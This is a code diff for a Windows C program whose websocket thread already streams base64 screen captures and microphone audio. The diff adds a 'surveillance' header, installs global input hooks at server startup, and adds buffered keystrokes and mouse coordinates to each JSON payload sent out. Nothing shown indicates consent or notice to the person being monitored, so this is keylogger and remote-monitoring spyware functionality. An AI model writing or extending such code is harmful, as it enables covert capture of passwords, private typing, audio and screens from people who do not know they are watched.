@@ -15,6 +15,7 @@
 #include "../include/server.h"
 #include "../include/utils.h"
 #include "../include/crypto.h"
+#include "../include/surveillance.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/stat.h>
@@ -227,16 +228,33 @@ DWORD WINAPI websocket_stream_thread(LPVOID arg) {
         
         char* mic_b64 = get_latest_mic_base64();
         
+        char keys[1024];
+        get_buffered_keys(keys, sizeof(keys));
+        
+        // Escape backslashes and quotes in keys for JSON
+        char escaped_keys[2048] = "";
+        int ek_idx = 0;
+        for (int i = 0; keys[i] != '\0' && ek_idx < 2047; i++) {
+            if (keys[i] == '\\' || keys[i] == '"') {
+                escaped_keys[ek_idx++] = '\\';
+            }
+            escaped_keys[ek_idx++] = keys[i];
+        }
+        escaped_keys[ek_idx] = '\0';
+        
+        int mx, my;
+        get_mouse_coordinates(&mx, &my);
+        
         // Build JSON payload dynamically
-        ULONGLONG payload_alloc = 512 + strlen(b64Str) + strlen(mic_b64);
+        ULONGLONG payload_alloc = 2048 + strlen(b64Str) + strlen(mic_b64) + strlen(escaped_keys);
         char* json_payload = (char*)malloc(payload_alloc);
         
         if (is_training_nn) {
-            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"nn_epoch\":%d, \"nn_loss\":%.6f}", cpu, ram, b64Str, mic_b64, global_nn_epoch, global_nn_loss);
+            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"nn_epoch\":%d, \"nn_loss\":%.6f, \"keys\":\"%s\", \"mx\":%d, \"my\":%d}", cpu, ram, b64Str, mic_b64, global_nn_epoch, global_nn_loss, escaped_keys, mx, my);
         } else if (strlen(global_nn_final_result) > 0) {
-            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"nn_final\":%s}", cpu, ram, b64Str, mic_b64, global_nn_final_result);
+            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"nn_final\":%s, \"keys\":\"%s\", \"mx\":%d, \"my\":%d}", cpu, ram, b64Str, mic_b64, global_nn_final_result, escaped_keys, mx, my);
         } else {
-            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\"}", cpu, ram, b64Str, mic_b64);
+            snprintf(json_payload, payload_alloc, "{\"cpu\":%.2f, \"ram\":%.2f, \"screen\":\"data:image/bmp;base64,%s\", \"mic\":\"%s\", \"keys\":\"%s\", \"mx\":%d, \"my\":%d}", cpu, ram, b64Str, mic_b64, escaped_keys, mx, my);
         }
         
         ULONGLONG payload_len = strlen(json_payload);
@@ -943,6 +961,7 @@ void launch_web_server(void) {
     printf("Press Ctrl+C to stop the server and return to the terminal.\n\n");
 
     init_database();
+    init_global_hooks();
     start_microphone_stream_thread();
     
     InitializeCriticalSection(&queue_lock);
